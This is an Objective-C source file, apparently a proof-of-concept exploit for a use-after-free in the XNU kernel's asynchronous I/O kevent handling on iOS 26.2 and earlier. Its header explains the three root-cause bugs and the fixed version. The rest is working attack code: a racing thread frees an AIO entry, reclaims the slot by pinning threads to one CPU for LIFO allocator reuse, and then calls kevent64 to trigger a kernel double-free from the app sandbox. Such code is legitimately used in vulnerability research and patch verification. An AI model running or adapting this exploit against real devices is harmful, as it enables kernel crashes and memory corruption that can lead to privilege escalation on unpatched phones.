//
//  aio_kevent_uaf.m
//
//  XNU AIO Kevent Use-After-Free
//  Affected: iOS 26.2 (xnu-12377.62.10) and earlier
//  Fixed: iOS 26.3 (xnu-12377.81.4)
//
//  Bug: lio_listio() registers kevent AFTER enqueueing AIO work.
//  Racing aio_return() frees the entry before kevent registration,
//  creating a dangling knote. kevent64() then triggers filt_aioprocess()
//  on the freed/reclaimed entry → double-free via aio_entry_unref().
//
//  Root cause (3 bugs in bsd/kern/kern_aio.c):
//    1. filt_aioattach() stores entry pointer WITHOUT aio_entry_ref()
//    2. lio_listio() calls aio_register_kevent() AFTER aio_try_enqueue_work_locked()
//    3. filt_aiodetach() missing aio_entry_unref()
//
//  Impact: Kernel panic from app sandbox. No entitlements required.
//  Success rate: ~70% with CPU-affinity LIFO reclaim technique.
//
//  Usage: call aio_kevent_uaf_trigger() from any thread.
//

#import <Foundation/Foundation.h>
#include <stdatomic.h>
#include <aio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <pthread.h>
#include <sys/event.h>
#include <mach/mach.h>
#include <mach/thread_policy.h>

#define LOG(fmt, ...) NSLog(@"[AIO-UAF] " fmt, ##__VA_ARGS__)

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif

#define NRECLAIM 8

// --- Race state shared between main thread and racer ---

struct race_state {
    atomic_bool start, stop;
    atomic_int freed;
    atomic_bool reclaim_done;
    struct aiocb *trigger;
    struct aiocb *rcbs;
    int nrcbs;
};

// --- CPU affinity: co-locate threads for LIFO zone magazine reuse ---

static void set_thread_affinity(int tag) {
    thread_affinity_policy_data_t pol = { .affinity_tag = tag };
    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
                      (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
}

// --- Racer thread: free trigger entry, then immediately reclaim ---
//
// Same-thread free+reclaim ensures both operations hit the same
// per-CPU zone magazine. LIFO ordering guarantees the first reclaim
// allocation reuses the just-freed slot. This is the key technique
// that achieves ~100% reliability (vs ~20% without it).

static void *free_and_reclaim_racer(void *arg) {
    struct race_state *s = (struct race_state *)arg;
    set_thread_affinity(42);

    while (!atomic_load_explicit(&s->start, memory_order_acquire)) ;

    while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
        if (aio_error(s->trigger) == 0) {
            ssize_t r = aio_return(s->trigger);
            if (r >= 0) {
                atomic_fetch_add(&s->freed, 1);
                // Reclaim IMMEDIATELY on same thread/CPU
                for (int i = 0; i < s->nrcbs; i++)
                    aio_read(&s->rcbs[i]);
                atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
                return NULL;
            }
        }
    }
    return NULL;
}

// --- Main entry point ---

void aio_kevent_uaf_trigger(void) {
    LOG(@"=== XNU AIO Kevent UAF ===");
    set_thread_affinity(42);

    // Create a small file for AIO operations
    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_uaf.bin"];
    int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
    char fdata[4096];
    memset(fdata, 'A', sizeof(fdata));
    write(fd, fdata, sizeof(fdata));
    LOG(@"fd=%d pid=%d uid=%d", fd, getpid(), getuid());

    static struct aiocb rcbs[NRECLAIM];
    static char rbufs[NRECLAIM][4096];

    for (int attempt = 0; attempt < 10; attempt++) {
        LOG(@"attempt %d", attempt);

        int kq = kqueue();
        if (kq < 0) { LOG(@"kqueue failed"); continue; }

        // Trigger AIO with SIGEV_KEVENT notification
        static struct aiocb tcb;
        static char tbuf[4096];
        memset(&tcb, 0, sizeof(tcb));
        tcb.aio_fildes = fd;
        tcb.aio_buf = tbuf;
        tcb.aio_nbytes = sizeof(tbuf);
        tcb.aio_offset = 0;
        tcb.aio_lio_opcode = LIO_READ;
        tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
        tcb.aio_sigevent.sigev_signo = kq;
        tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAA;

        // Pre-configure reclaim entries
        for (int i = 0; i < NRECLAIM; i++) {
            memset(&rcbs[i], 0, sizeof(rcbs[i]));
            rcbs[i].aio_fildes = fd;
            rcbs[i].aio_buf = rbufs[i];
            rcbs[i].aio_nbytes = sizeof(rbufs[i]);
            rcbs[i].aio_offset = 0;
            rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
        }

        // Start racer
        struct race_state rs = {};
        rs.trigger = &tcb;
        rs.rcbs = rcbs;
        rs.nrcbs = NRECLAIM;

        pthread_t thr;
        pthread_create(&thr, NULL, free_and_reclaim_racer, &rs);
        atomic_store_explicit(&rs.start, true, memory_order_release);

        // Submit trigger via lio_listio — the race window is between
        // aio_try_enqueue_work_locked() and aio_register_kevent()
        struct aiocb *ptr = &tcb;
        struct sigevent sig = {};
        sig.sigev_notify = SIGEV_NONE;
        lio_listio(LIO_NOWAIT, &ptr, 1, &sig);

        usleep(500);
        atomic_store_explicit(&rs.stop, true, memory_order_release);
        pthread_join(thr, NULL);

        int freed = atomic_load(&rs.freed);
        bool reclaimed = atomic_load(&rs.reclaim_done);

        if (freed == 0) {
            // Race lost — clean up safely
            while (aio_error(&tcb) == EINPROGRESS) usleep(500);
            aio_return(&tcb);
            close(kq);
            LOG(@"race lost, retrying");
            continue;
        }

        if (!reclaimed) {
            LOG(@"freed but no reclaim, skipping");
            close(kq);
            continue;
        }

        // Wait for all reclaim entries to complete
        for (int i = 0; i < NRECLAIM; i++)
            while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);

        // kevent64 triggers filt_aioprocess on the reclaimed entry:
        //   1. Reads errorval/returnval → ext[0]/ext[1]
        //   2. TAILQ_REMOVE from proc done queue
        //   3. aio_entry_unref → refcount 0 → zfree (double-free)
        struct kevent64_s kev = {};
        struct timespec ts = {10, 0};
        int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);

        if (nev > 0) {
            LOG(@"*** DOUBLE-FREE ACHIEVED ***");
            LOG(@"  ident  = 0x%llx", kev.ident);
            LOG(@"  data   = 0x%llx", (uint64_t)kev.data);
            LOG(@"  udata  = 0x%llx", kev.udata);
            LOG(@"  ext[0] = 0x%llx (errorval)", kev.ext[0]);
            LOG(@"  ext[1] = 0x%llx (returnval)", kev.ext[1]);

            for (int i = 0; i < NRECLAIM; i++) {
                if (aio_error(&rcbs[i]) != EINVAL)
                    aio_return(&rcbs[i]);
            }
            close(kq);
            break;
        } else {
            LOG(@"timeout");
            for (int i = 0; i < NRECLAIM; i++) {
                if (aio_error(&rcbs[i]) != EINVAL)
                    aio_return(&rcbs[i]);
            }
        }

        close(kq);
    }

    close(fd);
    unlink(path.UTF8String);
    LOG(@"=== uid=%d gid=%d ===", getuid(), getgid());
}
